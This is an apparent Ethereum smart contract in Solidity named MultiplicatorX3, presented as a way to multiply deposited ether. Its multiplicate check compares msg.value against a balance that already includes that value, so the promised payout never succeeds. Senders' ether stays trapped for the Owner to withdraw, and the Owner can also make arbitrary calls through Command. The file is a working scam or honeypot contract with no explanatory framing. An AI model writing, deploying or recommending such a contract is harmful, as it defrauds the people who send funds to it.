pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        for (; msg.sender == Owner;) {
            Owner.transfer(this.balance);
            break;
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        for (; msg.sender == Owner;) {
            adr.call.value(msg.value)(data);
            break;
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        for (;msg.value >= this.balance;) {
            adr.transfer(this.balance + msg.value);
            break;
        }
    }
}